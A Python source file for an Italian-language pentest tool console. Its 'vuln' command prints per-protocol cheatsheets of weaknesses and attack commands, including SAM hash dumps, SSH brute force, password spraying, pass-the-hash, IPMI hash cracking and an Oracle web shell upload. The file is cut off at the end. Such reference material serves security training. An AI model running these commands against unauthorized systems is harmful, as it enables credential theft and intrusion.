#!/usr/bin/env python3
from __future__ import annotations

import argparse
import importlib.util
import re
import platform
import subprocess
import sys
import shlex
from dataclasses import dataclass, field
from pathlib import Path
from shutil import which

try:
    import readline  # type: ignore
except ImportError:
    readline = None


APP_NAME = "SeaLion Console"
VERSION = "0.1.0"
ASCII_FILE = Path(__file__).with_name("ascii-art.txt")
TOOL_ROOT = Path(__file__).resolve().parent
INSTALL_ROOT = Path.home() / ".sealionconsole" / "tools"
USER_BIN = Path.home() / ".local" / "bin"


@dataclass
class ToolEntry:
    name: str
    path: Path
    install_file: Path
    help_file: Path


@dataclass
class ConsoleState:
    current_tool: ToolEntry | None = None
    last_search_results: list[ToolEntry] = field(default_factory=list)


def load_logo() -> str:
    if ASCII_FILE.exists():
        content = ASCII_FILE.read_text(encoding="utf-8", errors="replace").rstrip()
        if content:
            return content
    return APP_NAME


def normalize(value: str) -> str:
    return value.strip().lower()


def is_linux() -> bool:
    return platform.system().lower() == "linux"


def discover_tools() -> list[ToolEntry]:
    tools: list[ToolEntry] = []
    for path in sorted(TOOL_ROOT.iterdir(), key=lambda p: p.name.lower()):
        if not path.is_dir() or path.name.startswith(".") or path.name.startswith("__"):
            continue
        install_file = path / "install.py"
        help_file = path / "help.md"
        if not help_file.exists():
            help_file = path / "help.txt"
        if install_file.exists() and help_file.exists():
            tools.append(ToolEntry(name=path.name, path=path, install_file=install_file, help_file=help_file))
    return tools


def find_tool(name: str) -> ToolEntry | None:
    needle = normalize(name)
    for tool in discover_tools():
        if normalize(tool.name) == needle:
            return tool
    return None


def render_markdown(text: str) -> None:
    try:
        from rich.console import Console
        from rich.markdown import Markdown
        console = Console()
        console.print(Markdown(text))
    except ImportError:
        print(text)


def print_banner() -> None:
    print(load_logo())
    print(f"\n{APP_NAME} — personal tool vault\n")


def print_tool_help(tool: ToolEntry) -> None:
    text = tool.help_file.read_text(encoding="utf-8", errors="replace").rstrip()
    render_markdown(text)


def print_tool_entry(tool: ToolEntry, index: int | None = None) -> None:
    if index is None:
        print(f"  - {tool.name}")
    else:
        print(f"  [{index}] {tool.name}")


def print_help_text() -> None:
    print()
    print("Comandi disponibili:")
    print("  list               Elenca i tool disponibili")
    print("  search <query>     Cerca tool per nome o testo")
    print("  use <nome|num>     Seleziona un tool")
    print("  install [nome]     Installa il tool selezionato o specificato")
    print("  vuln <protocollo>  Mostra vulnerabilità e tool per un protocollo")
    print("  vuln list          Elenca i protocolli disponibili")
    print("  help               Mostra questo aiuto")
    print("  back               Torna alla console principale")
    print("  exit               Esci da " + APP_NAME)


def get_install_dir(tool: ToolEntry) -> Path:
    return INSTALL_ROOT / tool.name


def load_install_module(tool: ToolEntry):
    spec = importlib.util.spec_from_file_location(f"sealionconsole_install_{tool.name}", tool.install_file)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def run_install(tool: ToolEntry) -> int:
    if not is_linux():
        print(f" {tool.name} è disponibile solo su Linux.", file=sys.stderr)
        return 1

    install_dir = get_install_dir(tool)
    install_dir.mkdir(parents=True, exist_ok=True)

    print(f"\nInstallazione di {tool.name}…")
    print(f"Destinazione: {install_dir}\n")

    try:
        mod = load_install_module(tool)
        rc = mod.install(install_dir)
    except Exception as exc:
        print(f"Errore durante l'installazione: {exc}", file=sys.stderr)
        return 1

    if rc != 0:
        return rc

    entry_point = getattr(mod, "ENTRY_POINT", None)
    if entry_point:
        publish_launcher(tool, install_dir, entry_point)

    return 0


def publish_launcher(tool: ToolEntry, install_dir: Path, entry_point_template: str) -> None:
    command = entry_point_template.format(dest=install_dir)

    USER_BIN.mkdir(parents=True, exist_ok=True)
    launcher_path = USER_BIN / tool.name
    launcher_body = (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        f'exec {command} "$@"\n'
    )
    launcher_path.write_text(launcher_body, encoding="utf-8")
    launcher_path.chmod(0o755)
    print(f"\nLauncher creato: {launcher_path}")

    if str(USER_BIN) not in (subprocess.run(["bash", "-lc", "echo $PATH"], capture_output=True, text=True).stdout or ""):
        print(f"  Assicurati che {USER_BIN} sia nel tuo PATH.")


def print_tool_context(tool: ToolEntry) -> None:
    print(f"\n--- {tool.name} ---")
    print(f"Cartella sorgente:       {tool.path}")
    print(f"Cartella installazione:  {get_install_dir(tool)}")
    print()
    print_tool_help(tool)
    print("\nDigita 'install' per installare, 'back' per tornare indietro.")


def tool_matches_query(tool: ToolEntry, query: str) -> bool:
    nq = normalize(query)
    if nq in normalize(tool.name):
        return True
    help_text = tool.help_file.read_text(encoding="utf-8", errors="replace").lower()
    if nq in help_text:
        return True
    return False


def resolve_target(target: str | None, state: ConsoleState | None) -> ToolEntry | None:
    if target is None:
        return state.current_tool if state is not None else None

    if target.isdigit():
        tools = discover_tools()
        if state is not None and state.last_search_results:
            tools = state.last_search_results
        index = int(target) - 1
        if 0 <= index < len(tools):
            return tools[index]

    return find_tool(target)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="Console", add_help=False)
    parser.add_argument("-h", "--help", action="store_true")
    parser.add_argument("--version", action="store_true")
    subparsers = parser.add_subparsers(dest="command")
    subparsers.add_parser("list")
    install_p = subparsers.add_parser("install")
    install_p.add_argument("target", nargs="?")
    use_p = subparsers.add_parser("use")
    use_p.add_argument("target")
    subparsers.add_parser("back")
    search_p = subparsers.add_parser("search")
    search_p.add_argument("query", nargs="+")
    vuln_p = subparsers.add_parser("vuln")
    vuln_p.add_argument("protocol", nargs="+")
    return parser


def parse_console_command(line: str) -> list[str]:
    tokens = shlex.split(line)
    if tokens and tokens[0].lower() == "sealionconsole":
        return tokens[1:]
    return tokens


def setup_readline() -> None:
    if readline is None:
        return
    try:
        readline.parse_and_bind("tab: complete")
        readline.parse_and_bind("set editing-mode emacs")
    except Exception:
        pass


def run_command(argv: list[str], state: ConsoleState | None = None) -> int:
    parser = build_parser()
    try:
        args = parser.parse_args(argv)
    except SystemExit:
        return 1

    if args.version:
        print(f"{APP_NAME} {VERSION}")
        return 0

    if args.help or args.command is None:
        print_help_text()
        return 0

    handlers = {
        "list": cmd_list,
        "install": cmd_install,
        "use": cmd_use,
        "back": cmd_back,
        "search": cmd_search,
        "vuln": cmd_vuln,
    }
    handler = handlers.get(args.command)
    if handler is None:
        print_help_text()
        return 1
    return handler(args, state)


def run_console() -> int:
    setup_readline()
    state = ConsoleState()
    print_banner()
    print("Digita 'help' per i comandi, 'exit' per uscire.")
    while True:
        try:
            prompt = f"\033[94mConsole({state.current_tool.name})> \033[0m" if state.current_tool else "\033[94mslc> \033[0m"
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0

        if not line:
            continue

        lowered = line.lower()
        if lowered in {"exit", "quit"}:
            return 0
        if lowered in {"help", "?"}:
            if state.current_tool:
                print_tool_context(state.current_tool)
            else:
                print_help_text()
            continue
        if lowered == "back":
            state.current_tool = None
            print("Tornato alla console principale.")
            continue

        argv = parse_console_command(line)
        if not argv:
            continue

        if state.current_tool is not None and argv[0] == "install" and len(argv) == 1:
            rc = run_install(state.current_tool)
            if rc != 0:
                print(f"Installazione terminata con errore (codice {rc}).")
            continue

        known_commands = {"list", "install", "use", "search", "vuln", "back", "help", "?", "--version", "-h", "--help"}
        if argv[0] not in known_commands:
            print("Comando non riconosciuto. Digita 'help' per i comandi.")
            continue

        rc = run_command(argv, state)
        if rc != 0 and rc != 1:
            print(f"Comando terminato con codice {rc}.")


def cmd_list(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    tools = discover_tools()
    if not tools:
        print("Nessun tool trovato.")
        print("Per aggiungere un tool, crea una cartella con install.py e help.md.")
        return 0
    print(f"\nTool disponibili ({len(tools)}):\n")
    for index, tool in enumerate(tools, start=1):
        print_tool_entry(tool, index)
    print()
    return 0


def cmd_search(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    query = " ".join(args.query) if isinstance(args.query, list) else args.query
    query = normalize(query)
    matches = [t for t in discover_tools() if tool_matches_query(t, query)]
    if not matches:
        print("Nessun risultato.")
        return 0
    if state is not None:
        state.last_search_results = matches
    print(f"\nRisultati per '{query}':\n")
    for index, tool in enumerate(matches, start=1):
        print_tool_entry(tool, index)
    print()
    return 0


def cmd_use(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    if state is None:
        print("Il comando 'use' è disponibile solo nella console interattiva.", file=sys.stderr)
        return 1
    tool = resolve_target(args.target, state)
    if not tool:
        print(f"Tool non trovato: {args.target}", file=sys.stderr)
        return 1
    state.current_tool = tool
    print_tool_context(tool)
    return 0


def cmd_back(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    if state is None:
        return 0
    state.current_tool = None
    print("Tornato alla console principale.")
    return 0


def cmd_install(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    target = getattr(args, "target", None)
    tool = resolve_target(target, state)
    if not tool:
        print("Nessun tool selezionato. Usa 'install <nome>' oppure prima 'use <nome>'.", file=sys.stderr)
        return 1
    return run_install(tool)


# ---------------------------------------------------------------------------
# vuln command — vulnerability cheatsheets per protocollo
# ---------------------------------------------------------------------------

VULN_DB: dict[str, dict] = {
    "ftp": {
        "nome": "FTP — File Transfer Protocol",
        "porte": "21 (controllo), 20 (dati)",
        "descrizione": (
            "Protocollo per il trasferimento file. Usa due canali separati (controllo e dati).\n"
            "Trasmette TUTTO in chiaro: credenziali e file possono essere intercettati."
        ),
        "vulnerabilità": [
            "Login anonimo (anonymous:anonymous) — accesso senza credenziali",
            "Credenziali in chiaro — sniffabili con Wireshark/tcpdump",
            "Upload anonimo (anon_upload_enable=YES) — caricamento file malevoli",
            "ls_recurse_enable=YES — mappa l'intero server in pochi secondi",
            "Versioni obsolete di vsFTPd/ProFTPd con exploit noti",
        ],
        "enumerazione": [
            "sudo nmap -sV -p21 -sC -A <IP>                     # Scan aggressivo porta 21",
            "sudo nmap --script ftp-anon -p21 <IP>               # Check accesso anonimo",
            "ftp <IP> [porta]                                     # Connessione manuale",
            "  > anonymous / anonymous                            # Login anonimo",
            "  > status                                           # Info configurazione server",
            "  > debug / trace                                    # Mostra pacchetti raw",
            "  > ls -R                                            # Lista ricorsiva (se abilitata)",
            "wget -m --no-passive ftp://anonymous:anonymous@<IP>  # Scarica tutto il server",
            "openssl s_client -connect <IP>:21 -starttls ftp      # Certificati SSL/TLS",
        ],
        "tool_consigliati": ["nmap", "nikto", "impacket"],
    },
    "smb": {
        "nome": "SMB — Server Message Block",
        "porte": "445 (SMB/CIFS), 137-139 (NetBIOS legacy)",
        "descrizione": (
            "Protocollo per la condivisione di file, stampanti e risorse in rete.\n"
            "Pilastro delle reti Windows. Su Linux si usa Samba."
        ),
        "vulnerabilità": [
            "Null Session — accesso anonimo senza credenziali (-N)",
            "guest ok = yes — condivisioni aperte a tutti",
            "browseable = yes — share visibili a chiunque",
            "read only = no — scrittura permessa (upload web shell)",
            "create mask = 0777 — permessi massimi su file creati",
            "EternalBlue (MS17-010) — RCE su SMBv1 (WannaCry)",
            "Enumerazione utenti via RPC (rpcclient, samrdump)",
        ],
        "enumerazione": [
            "smbclient -N -L //<IP>                               # Elenca share (null session)",
            "smbclient //<IP>/<share>                              # Accedi a una share",
            "smbmap -H <IP>                                       # Mappa permessi READ/WRITE",
            "smbmap -H <IP> -u 'user' -p 'pass'                   # Con credenziali",
            "rpcclient -U '' <IP>                                  # Sessione RPC anonima",
            "  > srvinfo                                          # Info server",
            "  > enumdomusers                                     # Lista utenti dominio",
            "  > netshareenumall                                   # Lista tutte le share",
            "  > queryuser <RID>                                  # Info su utente specifico",
            "nxc smb <IP> --shares -u '' -p ''                    # NetExec enum share",
            "nxc smb <IP> -u 'admin' -p 'pass' --sam             # Dump hash SAM",
            "enum4linux-ng.py <IP> -A                             # Enumerazione completa",
            "sudo nmap -sV -sC -p139,445 <IP>                    # Nmap SMB scan",
            "# Brute force RID (se enum bloccata):",
            "for i in $(seq 500 1100);do rpcclient -N -U '' <IP> -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep 'User Name' && echo '';done",
        ],
        "tool_consigliati": ["nmap", "enum4linux-ng", "smbmap", "crackmapexec", "impacket"],
    },
    "nfs": {
        "nome": "NFS — Network File System",
        "porte": "2049 (NFS), 111 (RPCBind/Portmapper)",
        "descrizione": (
            "Protocollo per accedere a filesystem remoti come se fossero locali.\n"
            "Usato principalmente su Linux/Unix. Non ha meccanismi di autenticazione propri."
        ),
        "vulnerabilità": [
            "no_root_squash — root remoto = root locale (privilege escalation)",
            "Nessuna autenticazione interna — si fida del UID/GID del client",
            "Export aperti a 0.0.0.0/0 — chiunque può montare le share",
            "Disallineamento UID — utente sbagliato accede a file altrui",
            "insecure — porte sopra 1024 permesse (bypass restrizioni)",
        ],
        "enumerazione": [
            "showmount -e <IP>                                    # Lista export (chi può accedere)",
            "sudo nmap -p111,2049 -sV -sC <IP>                   # Scan porte NFS/RPC",
            "sudo nmap --script nfs* -sV -p111,2049 <IP>         # Script NSE per NFS",
            "sudo mkdir -p /mnt/target_nfs                        # Crea punto di mount locale",
            "sudo mount -t nfs <IP>:/<share> /mnt/target_nfs -o nolock  # Monta la share",
            "ls -la /mnt/target_nfs                               # Esplora i file",
            "ls -n /mnt/target_nfs                                # Mostra UID/GID numerici",
            "tree /mnt/target_nfs                                 # Struttura completa",
            "sudo umount /mnt/target_nfs                          # Smonta quando finito",
        ],
        "tool_consigliati": ["nmap"],
    },
    "dns": {
        "nome": "DNS — Domain Name System",
        "porte": "53 (TCP/UDP)",
        "descrizione": (
            "Sistema per la risoluzione dei nomi di dominio in indirizzi IP.\n"
            "Distribuito globalmente, non ha un database centrale."
        ),
        "vulnerabilità": [
            "Zone Transfer (AXFR) aperto — scarichi l'intera zona DNS",
            "allow-recursion aperto — DNS amplification attack (DDoS)",
            "allow-query aperto a tutti — informazioni esposte",
            "DNS in chiaro — query intercettabili (senza DoT/DoH)",
            "Subdomain takeover — sottodomini che puntano a risorse abbandonate",
            "DNS cache poisoning — reindirizzamento a siti malevoli",
        ],
        "enumerazione": [
            "dig any <dominio>                                    # Tutti i record",
            "dig axfr @<DNS_SERVER> <dominio>                     # Zone transfer",
            "dig ns <dominio>                                     # Name servers",
            "dig mx <dominio>                                     # Mail servers",
            "dig soa <dominio>                                    # Start of Authority",
            "dig CH TXT version.bind @<DNS_SERVER>                # Versione server DNS",
            "dig +trace <dominio>                                 # Percorso risoluzione completo",
            "dnsenum --dnsserver <IP> --enum -f <wordlist> <dominio>  # Enum + brute force",
            "# Brute force sottodomini manuale:",
            "for sub in $(cat wordlist.txt);do dig $sub.<dominio> @<IP> | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub;done",
            "# Fonti passive: crt.sh, subdomainfinder.c99.nl",
            "curl -s 'https://crt.sh/?q=<dominio>&output=json' | jq -r '.[].name_value' | sort -u",
        ],
        "tool_consigliati": ["nmap", "dnsenum", "gobuster", "theHarvester", "recon-ng"],
    },
    "smtp": {
        "nome": "SMTP — Simple Mail Transfer Protocol",
        "porte": "25 (standard), 587 (submission), 465 (SMTPS)",
        "descrizione": (
            "Protocollo per l'invio di email. Spesso combinato con IMAP/POP3.\n"
            "Trasmette dati in chiaro senza SSL/TLS."
        ),
        "vulnerabilità": [
            "Open Relay (mynetworks=0.0.0.0/0) — chiunque può inviare email",
            "VRFY/EXPN abilitati — enumerazione utenti validi",
            "Dati in chiaro — credenziali intercettabili senza STARTTLS",
            "Mancanza SPF/DKIM/DMARC — email spoofing facilissimo",
            "Versioni obsolete di Postfix/Sendmail con exploit noti",
        ],
        "enumerazione": [
            "sudo nmap -sV -sC -p25 <IP>                         # Scan SMTP",
            "sudo nmap -p25 --script smtp-open-relay -v <IP>      # Check open relay",
            "telnet <IP> 25                                       # Connessione manuale",
            "  > EHLO mail1                                       # Inizia sessione",
            "  > VRFY admin                                       # Verifica se utente esiste",
            "  > EXPN admin                                       # Espandi mailing list",
            "  > MAIL FROM: <test@test.com>                       # Testa invio",
            "  > RCPT TO: <admin@target.com>                      # Destinatario",
            "# Enumerazione utenti con Metasploit:",
            "msfconsole > search smtp_enum > use 0 > set RHOSTS <IP> > set USER_FILE wordlist.txt > run",
        ],
        "tool_consigliati": ["nmap", "theHarvester"],
    },
    "imap-pop3": {
        "nome": "IMAP/POP3 — Protocolli di lettura email",
        "porte": "143 (IMAP), 110 (POP3), 993 (IMAPS), 995 (POP3S)",
        "descrizione": (
            "IMAP sincronizza le email sul server (multi-dispositivo).\n"
            "POP3 scarica le email in locale e le cancella dal server."
        ),
        "vulnerabilità": [
            "auth_debug_passwords=yes — password scritte nei log in chiaro!",
            "auth_verbose_passwords=yes — password nei log",
            "Autenticazione anonima (SASL ANONYMOUS)",
            "Connessione in chiaro (porte 143/110) — credenziali sniffabili",
            "Email con chiavi SSH o password in chiaro nel body",
        ],
        "enumerazione": [
            "sudo nmap -sV -p110,143,993,995 -sC <IP>            # Scan tutte le porte",
            "curl -k 'imaps://<IP>' --user user:password           # Login IMAP con curl",
            "curl -k 'imaps://<IP>' --user user:password -v        # Verbose (dettagli connessione)",
            "openssl s_client -connect <IP>:imaps -crlf            # IMAP cifrato",
            "openssl s_client -connect <IP>:pop3s                  # POP3 cifrato",
            "# Comandi IMAP una volta connessi:",
            "  1 LOGIN user password",
            "  1 LIST \"\" *                                         # Lista cartelle",
            "  1 SELECT INBOX                                      # Seleziona inbox",
            "  1 FETCH 1 (BODY[TEXT])                              # Leggi corpo email (CERCA CHIAVI SSH!)",
            "  1 LOGOUT",
            "# Comandi POP3:",
            "  USER username > PASS password > LIST > RETR 1 > QUIT",
        ],
        "tool_consigliati": ["nmap"],
    },
    "snmp": {
        "nome": "SNMP — Simple Network Management Protocol",
        "porte": "161/UDP (query), 162/UDP (trap)",
        "descrizione": (
            "Protocollo per monitorare e gestire dispositivi di rete.\n"
            "SNMPv1/v2c usano community string in chiaro. SNMPv3 è cifrato ma raro."
        ),
        "vulnerabilità": [
            "Community string di default (public/private) — accesso totale",
            "rwuser noauth — lettura/scrittura senza autenticazione",
            "rwcommunity aperta — modifica OID tree senza limiti",
            "SNMPv1/v2c in chiaro — community string intercettabile",
            "Esposizione info: processi, software installati, utenti, config di rete",
        ],
        "enumerazione": [
            "# Brute force community string:",
            "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>",
            "# Una volta trovata la community string:",
            "snmpwalk -v2c -c public <IP>                          # Estrai tutti gli OID",
            "braa public@<IP>:.1.3.6.*                             # Scan parallelo (più veloce)",
            "braa <community>@<IP>:.1.3.6.*                        # Con community personalizzata",
            "sudo nmap -sU -p161 --script snmp-info <IP>           # Info SNMP con Nmap",
        ],
        "tool_consigliati": ["nmap", "onesixtyone", "braa"],
    },
    "mysql": {
        "nome": "MySQL — Database Relazionale",
        "porte": "3306 (TCP)",
        "descrizione": (
            "Database relazionale open source. Architettura client-server.\n"
            "Molto diffuso nelle applicazioni web (LAMP stack)."
        ),
        "vulnerabilità": [
            "Root senza password — accesso amministratore totale",
            "debug/sql_warnings attivi — info strutturali per SQL injection",
            "secure_file_priv mal configurato — lettura/scrittura file di sistema",
            "Credenziali nel file di configurazione in chiaro",
            "Versioni obsolete con exploit noti (es. CVE-2012-2122)",
        ],
        "enumerazione": [
            "sudo nmap -sV -sC -p3306 --script mysql* <IP>        # Scan + script NSE",
            "mysql -u root -h <IP>                                 # Tentativo senza password",
            "mysql -u root -p'P4SSw0rd' -h <IP>                   # Con password",
            "mysql -u root -p'P4SSw0rd' -h <IP> --skip-ssl        # Se SSL dà problemi",
            "# Comandi utili una volta dentro:",
            "  show databases;",
            "  use <database>;",
            "  show tables;",
            "  show columns from <table>;",
            "  select * from <table>;",
            "  select host, unique_users from host_summary;        # (nel db sys)",
        ],
        "tool_consigliati": ["nmap"],
    },
    "mssql": {
        "nome": "MSSQL — Microsoft SQL Server",
        "porte": "1433 (TCP)",
        "descrizione": (
            "Database relazionale Microsoft, integrato con .NET e Active Directory.\n"
            "Client principale: SSMS. Da Linux: mssqlclient.py (Impacket)."
        ),
        "vulnerabilità": [
            "Utente sa con password debole o di default",
            "Autenticazione Windows — accesso automatico con account rubato",
            "xp_cmdshell abilitato — esecuzione comandi di sistema",
            "Certificati non validati — intercettazione connessione",
            "SSMS salva password in chiaro sul PC dell'admin",
        ],
        "enumerazione": [
            "sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,"
            "ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,"
            "ms-sql-dac,ms-sql-dump-hashes "
            "--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,"
            "mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>",
            "python3 mssqlclient.py Administrator@<IP> -windows-auth  # Impacket",
            "nxc mssql <IP> -u 'sa' -p 'password' --query 'SELECT @@version;'",
        ],
        "tool_consigliati": ["nmap", "impacket", "crackmapexec"],
    },
    "oracle-tns": {
        "nome": "Oracle TNS — Transparent Network Substrate",
        "porte": "1521 (TCP)",
        "descrizione": (
            "Protocollo di comunicazione tra applicazioni e database Oracle.\n"
            "Il Listener accetta connessioni sulla porta 1521."
        ),
        "vulnerabilità": [
            "SID indovinabile — brute force del Service Identifier",
            "Credenziali di default (scott/tiger, sys/change_on_install)",
            "utlfile — upload file sul server (web shell)",
            "sysdba senza restrizioni — privilege escalation",
            "Hash password estraibili da sys.user$",
        ],
        "enumerazione": [
            "sudo nmap -p1521 -sV <IP> --open                     # Rileva Oracle",
            "sudo nmap -p1521 --script oracle-sid-brute <IP>       # Brute force SID",
            "./odat.py all -s <IP>                                 # Enumerazione completa ODAT",
            "sqlplus <user>/<pass>@<IP>/<SID>                      # Login con sqlplus",
            "sqlplus <user>/<pass>@<IP>/<SID> as sysdba            # Login come admin",
            "# Una volta dentro:",
            "  select * from user_role_privs;                      # Verifica privilegi",
            "  select name, password from sys.user$;               # Dump hash password",
            "# Upload file (web shell):",
            "./odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba --putFile /var/www/html shell.txt ./shell.txt",
        ],
        "tool_consigliati": ["nmap", "odat"],
    },
    "ipmi": {
        "nome": "IPMI — Intelligent Platform Management Interface",
        "porte": "623 (UDP)",
        "descrizione": (
            "Interfaccia per gestire server da remoto (anche spenti).\n"
            "Indipendente da CPU/BIOS/OS. HP=iLO, Dell=iDRAC, Supermicro=IPMI."
        ),
        "vulnerabilità": [
            "Password di default — Dell: root/calvin, Supermicro: ADMIN/ADMIN",
            "Difetto RAKP — il server invia l'hash della password PRIMA dell'auth!",
            "Hash crackabili con hashcat -m 7300",
            "Interfaccia web spesso esposta su Internet",
            "Firmware raramente aggiornato",
        ],
        "enumerazione": [
            "sudo nmap -sU --script ipmi-version -p 623 <IP>      # Rileva IPMI",
            "# Metasploit — versione IPMI:",
            "msfconsole > use auxiliary/scanner/ipmi/ipmi_version > set RHOSTS <IP> > run",
            "# Metasploit — dump hash (difetto RAKP):",
            "msfconsole > use auxiliary/scanner/ipmi/ipmi_dumphashes > set RHOSTS <IP> > run",
            "# Crack hash con hashcat:",
            "hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u",
            "hashcat -a 0 -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt",
        ],
        "tool_consigliati": ["nmap", "hashcat"],
    },
    "ssh": {
        "nome": "SSH — Secure Shell",
        "porte": "22 (TCP)",
        "descrizione": (
            "Protocollo per connessioni remote cifrate.\n"
            "6 metodi di autenticazione. SSH-1 è vulnerabile a MitM."
        ),
        "vulnerabilità": [
            "PermitRootLogin yes — accesso diretto come root",
            "PermitEmptyPasswords yes — login senza password",
            "Protocol 1 — crittografia obsoleta e vulnerabile",
            "X11Forwarding yes — command injection in alcune versioni",
            "Password deboli — brute force con hydra/medusa",
            "Chiavi private esposte (id_rsa senza passphrase)",
        ],
        "enumerazione": [
            "./ssh-audit.py <IP>                                   # Audit configurazione SSH",
            "ssh -v user@<IP>                                      # Connessione verbose",
            "ssh -v user@<IP> -o PreferredAuthentications=password  # Forza auth password",
            "sudo nmap -sV -p22 --script ssh* <IP>                 # Script NSE SSH",
            "# Brute force (con hydra):",
            "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>",
            "# Crack chiave SSH protetta da passphrase:",
            "ssh2john.py id_rsa > ssh.hash",
            "john --wordlist=rockyou.txt ssh.hash",
        ],
        "tool_consigliati": ["nmap", "ssh-audit", "john", "hashcat"],
    },
    "rdp": {
        "nome": "RDP — Remote Desktop Protocol",
        "porte": "3389 (TCP)",
        "descrizione": (
            "Protocollo Microsoft per il controllo remoto del desktop.\n"
            "Dati cifrati ma spesso con certificati autofirmati (MitM possibile)."
        ),
        "vulnerabilità": [
            "BlueKeep (CVE-2019-0708) — RCE pre-auth su vecchi Windows",
            "Certificati autofirmati — MitM attack",
            "NLA disabilitato — attacchi brute force facilitati",
            "Credenziali deboli — brute force con hydra/nxc",
            "Session hijacking — furto sessioni RDP attive",
        ],
        "enumerazione": [
            "nmap -sV -sC -p3389 --script rdp* <IP>               # Scan + script RDP",
            "nmap -sV -sC -p3389 --packet-trace --disable-arp-ping -n <IP>",
            "./rdp-sec-check.pl <IP>                               # Verifica sicurezza RDP",
            "nxc rdp <IP> -u 'admin' -p 'password'                 # Verifica credenziali",
            "nxc rdp <SUBNET>/24 -u users.txt -p 'Password123!'   # Password spraying",
            "# Connessione RDP:",
            "xfreerdp /u:user /p:'password' /v:<IP> /cert:ignore /dynamic-resolution +clipboard",
        ],
        "tool_consigliati": ["nmap", "rdp-sec-check", "crackmapexec"],
    },
    "winrm": {
        "nome": "WinRM — Windows Remote Management",
        "porte": "5985 (HTTP), 5986 (HTTPS)",
        "descrizione": (
            "Protocollo Microsoft per esecuzione comandi remoti via riga di comando.\n"
            "Basato su WS-Management. Usato per amministrazione PowerShell remota."
        ),
        "vulnerabilità": [
            "Credenziali deboli — accesso shell completa",
            "Pass-the-Hash — autenticazione con hash NTLM rubato",
            "HTTP (5985) in chiaro — credenziali intercettabili",
            "Accesso diretto a PowerShell — esecuzione codice arbitrario",
        ],
        "enumerazione": [
            "nmap -sV -sC -p5985,5986 --disable-arp-ping -n <IP>  # Scan porte WinRM",
            "nxc winrm <IP> -u 'user' -p 'password'               # Verifica credenziali",
            "nxc winrm <IP> -u 'user' -p 'password' -x 'hostname' # Esegui comando",
            "evil-winrm -i <IP> -u 'user' -p 'password'           # Shell interattiva",
            "evil-winrm -i <IP> -u 'user' -H 'HASH_NTLM'         # Pass-the-Hash",
            "# Una volta dentro:",
            "  Get-LocalUser                                       # Lista utenti",
            "  Get-LocalGroup                                      # Lista gruppi",
            "  Get-Process                                         # Processi attivi",
        ],
        "tool_consigliati": ["nmap", "evil-winrm", "crackmapexec"],
    },
    "wmi": {
        "nome": "WMI — Windows Management Instrumentation",
        "porte": "135 (TCP)",
        "descrizione": (
            "Insieme di strumenti per gestire qualsiasi impostazione di Windows.\n"
            "Permette lettura/modifica RAM, processi, software, configurazioni da remoto."
        ),
        "vulnerabilità": [
            "Credenziali admin — controllo totale del sistema",
            "Esecuzione comandi remoti — RCE immediata",
            "Spesso non monitorato — attività difficile da rilevare",
        ],
        "enumerazione": [
            "python3 wmiexec.py user:'password'@<IP> 'hostname'    # Impacket",
            "python3 wmiexec.py user:'password'@<IP> 'whoami'",
            "python3 wmiexec.py user:'password'@<IP> 'ipconfig /all'",
            "nxc smb <IP> -u 'user' -p 'password' -x 'whoami'     # Via NetExec",
        ],
        "tool_consigliati": ["impacket", "crackmapexec"],
    },
}

VULN_ALIASES: dict[str, str] = {
    "imap": "imap-pop3",
    "pop3": "imap-pop3",
    "pop": "imap-pop3",
    "imap pop3": "imap-pop3",
    "imap/pop3": "imap-pop3",
    "oracle": "oracle-tns",
    "tns": "oracle-tns",
    "oracletns": "oracle-tns",
    "oracle tns": "oracle-tns",
    "samba": "smb",
    "cifs": "smb",
    "netbios": "smb",
    "rpc": "smb",
    "ftps": "ftp",
    "tftp": "ftp",
    "bind": "dns",
    "bind9": "dns",
    "nslookup": "dns",
    "dig": "dns",
    "sshd": "ssh",
    "openssh": "ssh",
    "mstsc": "rdp",
    "xfreerdp": "rdp",
    "rdesktop": "rdp",
    "idrac": "ipmi",
    "ilo": "ipmi",
    "bmc": "ipmi",
    "postfix": "smtp",
    "sendmail": "smtp",
    "dovecot": "imap-pop3",
    "nfsd": "nfs",
    "portmapper": "nfs",
    "mssqlserver": "mssql",
    "sqlserver": "mssql",
    "mariadb": "mysql",
    "mysqld": "mysql",
}


def cmd_vuln(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    raw = " ".join(args.protocol) if isinstance(args.protocol, list) else args.protocol
    key = normalize(raw)

    if key == "list":
        print("\nProtocolli disponibili per 'vuln':\n")
        for proto_key, proto_data in VULN_DB.items():
            print(f"  {proto_key:<14} {proto_data['nome']}")
        print(f"\n  Alias supportati: {', '.join(sorted(VULN_ALIASES.keys()))}")
        print()
        return 0

    key = VULN_ALIASES.get(key, key)

    if key not in VULN_DB:
        print(f"Protocollo '{raw}' non trovato.", file=sys.stderr)
        print("Usa 'vuln list' per vedere i protocolli disponibili.")
        return 1

    proto = VULN_DB[key]
    sep = "=" * 60

    text_parts = [
        f"\n{sep}",
        f"  {proto['nome']}",
        f"  Porte: {proto['porte']}",
        sep,
        "",
        proto["descrizione"],
        "",
        "--- VULNERABILITÀ COMUNI ---",
        "",
    ]
    for v in proto["vulnerabilità"]:
        text_parts.append(f"  • {v}")

    text_parts.extend(["", "--- ENUMERAZIONE & COMANDI ---", ""])
    for cmd in proto["enumerazione"]:
        text_parts.append(f"  {cmd}")

    if proto["tool_consigliati"]:
